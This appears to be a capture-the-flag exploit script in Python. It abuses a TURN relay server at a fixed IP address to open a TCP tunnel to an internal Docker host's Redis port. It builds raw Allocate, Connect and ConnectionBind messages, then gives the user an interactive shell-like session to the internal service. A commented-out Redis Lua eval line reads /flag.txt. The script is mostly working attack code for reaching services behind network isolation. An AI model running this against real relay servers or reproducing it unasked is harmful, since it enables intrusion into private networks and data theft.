#!/usr/bin/env python3

import socket
import binascii
import random
import sys
import select
import string

HOST = '216.165.2.41'  # The server's hostname or IP address
PORT = 3478        # The port used by the server

CONNECTBIND_REQUEST = b'\x00\x0b'
CONNECT_REQUEST = b'\x00\x0a'
ALLOCATE_REQUEST = b'\x00\x03'
REQUESTED_TRANSPORT = b'\x00\x19'
TCP=b'\x06'
UDP=b'\x11' #17
COOKIE=b'\x21\x12\xA4\x42'
LIFETIME=b'\x00\x0D'
XOR_RELAYED_ADDRESS=b'\x00\x16'
XOR_MAPPED_ADDRESS=b'\x00\x20'
XOR_PEER_ADDRESS=b'\x00\x12'
SOFTWARE=b'\x80\x22'
CONNECTION_ID=b'\x00\x2a'

'''
https://tools.ietf.org/html/rfc6062
https://tools.ietf.org/html/rfc5766
https://tools.ietf.org/html/rfc5389
0x003  :  Allocate          (only request/response semantics defined)
0x004  :  Refresh           (only request/response semantics defined)
0x006  :  Send              (only indication semantics defined)
0x007  :  Data              (only indication semantics defined)
0x008  :  CreatePermission  (only request/response semantics defined
0x009  :  ChannelBind       (only request/response semantics defined)
0x000a :  Connect
0x000b :  ConnectionBind
0x000c :  ConnectionAttempt

STUN Attributes

0x000C: CHANNEL-NUMBER
0x000D: LIFETIME
0x0010: Reserved (was BANDWIDTH)
0x0012: XOR-PEER-ADDRESS
0x0013: DATA
0x0016: XOR-RELAYED-ADDRESS
0x0018: EVEN-PORT
0x0019: REQUESTED-TRANSPORT
0x001A: DONT-FRAGMENT
0x0021: Reserved (was TIMER-VAL)
0x0022: RESERVATION-TOKEN
0x0000: (Reserved)
0x0001: MAPPED-ADDRESS
0x0002: (Reserved; was RESPONSE-ADDRESS)
0x0003: (Reserved; was CHANGE-ADDRESS)
0x0004: (Reserved; was SOURCE-ADDRESS)
0x0005: (Reserved; was CHANGED-ADDRESS)
0x0006: USERNAME
0x0007: (Reserved; was PASSWORD)
0x0008: MESSAGE-INTEGRITY
0x0009: ERROR-CODE
0x000A: UNKNOWN-ATTRIBUTES
0x000B: (Reserved; was REFLECTED-FROM)
0x0014: REALM
0x0015: NONCE
0x0020: XOR-MAPPED-ADDRESS
0x002a :  CONNECTION-ID

Comprehension-optional range (0x8000-0xFFFF)
0x8022: SOFTWARE
0x8023: ALTERNATE-SERVER
0x8028: FINGERPRINT
'''

def build_allocate_request():

  attributes = REQUESTED_TRANSPORT 
  attributes += b'\x00\x04' #length
  attributes += TCP
  attributes += b'\x00\x00\x00' #reserved?

  attributes += LIFETIME
  attributes += b'\x00\x04' # length
  attributes += b'\x00\x00\x0e\x10' # 3600

  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = ALLOCATE_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes

def gen_tran_id():
    return binascii.unhexlify(''.join(random.choice('0123456789ABCDEF') for i in range(24)))

def xor_addr_to_ip(xor_address):
  ip1 = xor_address[0] ^ COOKIE[0]
  ip2 = xor_address[1] ^ COOKIE[1]
  ip3 = xor_address[2] ^ COOKIE[2]
  ip4 = xor_address[3] ^ COOKIE[3]
  return str(ip1) + '.' + str(ip2) + '.' + str(ip3) + '.' + str(ip4)

def build_connect_request():

  attributes = XOR_PEER_ADDRESS
  attributes += b'\x00\x08' #length
  attributes += b'\x00\x01' #ipv4 = 0x01
  attributes += b'\x39\xf9' # 6379 -> 0x18eb ^ 0x2112 -> 0x39f9
  #attributes += b'\x5e\x12\xa4\x43' # 127.0.0.1 -> 0x7F000001 ^ 0x2112A442 -> 0x5e12a443
  attributes += b'\x8d\x03\xa4\x41' # 172.17.0.3 -> 0xAC110003 ^ 0x2112A442 -> 0x8d03a441
  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = CONNECT_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes

def build_connectbind_request(connection_id):

  attributes = CONNECTION_ID
  attributes += b'\x00\x04' #length
  attributes += connection_id
  attr_len = len(attributes)
  attr_len = attr_len.to_bytes(2, 'big')

  header = CONNECTBIND_REQUEST
  header += attr_len
  header += COOKIE
  txnId = gen_tran_id()
  header += txnId
  print('generated txn id', binascii.hexlify(txnId))

  return header + attributes

def parse_response(data):
  print('Message Type', data[0:2])

  msg_len = int.from_bytes(data[2:4], "big")
  print('Length', msg_len)

  cookie = data[4:8]
  print('Cookie', binascii.hexlify(cookie))

  txn_id = data[8:20]
  print('txn ID', binascii.hexlify(txn_id))

  attributes = data[20:20+msg_len]
  idx = 0
  while(idx < len(attributes)):
    attr_type = attributes[idx:idx+2]
    idx += 2
    attr_len = int.from_bytes(attributes[idx:idx+2], "big")
    idx += 2
    value = attributes[idx:idx+attr_len]
    idx += attr_len
    if (attr_type == XOR_MAPPED_ADDRESS):
      print('attibute type XOR-MAPPED-ADDRESS')
      port = value[2:4]
      port0 = (port[0] ^ COOKIE[0]).to_bytes(1, byteorder='big')
      port0 += (port[1] ^ COOKIE[1]).to_bytes(1, byteorder='big')
      print('port', int.from_bytes(port0, "big"))
      ip = xor_addr_to_ip(value[4:])
      print('ip', ip)
      print('value', binascii.hexlify(value))

    elif (attr_type == XOR_RELAYED_ADDRESS):
      print('attribute type XOR-RELAYED-ADDRESS')
      port = value[2:4]
      port0 = (port[0] ^ COOKIE[0]).to_bytes(1, byteorder='big')
      port0 += (port[1] ^ COOKIE[1]).to_bytes(1, byteorder='big')
      print('port', int.from_bytes(port0, "big"))
      ip = xor_addr_to_ip(value[4:])
      print('ip', ip)
      print('value', binascii.hexlify(value))

    elif (attr_type == LIFETIME):
      print('attribute type LIFETIME')
      print('value', int.from_bytes(value, "big"))


    elif (attr_type == SOFTWARE):
      print('attribute type SOFTWARE')
      print('value', value.decode('ascii'))

    elif (attr_type == CONNECTION_ID):
      print('attribute type CONNECTION_ID')
      print('value', value)
      return value

    else:
      print('attribute type', binascii.hexlify(attr_type))
      print('length', attr_len)
      print('value', binascii.hexlify(value))


# Allocation Request
cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cs.connect((HOST, PORT))
cs.sendall(build_allocate_request())
data = cs.recv(1024)

print('Raw Allocation Request Response', data)
parse_response(data)
print('\n')

# Connect Request
cs.sendall(build_connect_request())
data = cs.recv(1024)

print('Raw Connect Request Response', data)
connection_id = parse_response(data)
print('\n')

# ConnectionBind Request
ds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ds.connect((HOST, PORT))
ds.sendall(build_connectbind_request(connection_id))
data = ds.recv(1024)

print('Raw ConnectionBind Request Response', data)
parse_response(data)
print('\n')

# Get keys from redis
# ds.sendall("eval \"base.loadfile('/flag.txt')\" 0\n".encode('ascii'))
# data = ds.recv(1024)
# print(data)

while 1:
  socket_list = [sys.stdin, ds]
  
  # Get the list sockets which are readable
  read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
  
  for sock in read_sockets:
    #incoming message from remote server
    if sock == ds:
      data = sock.recv(4096)
      if not data :
        print('Connection closed')
        sys.exit()
      else :
        #print data
        sys.stdout.write(data.decode('ascii'))
    
    #user entered a message
    else :
      msg = sys.stdin.readline()
      ds.send(msg.encode('ascii'))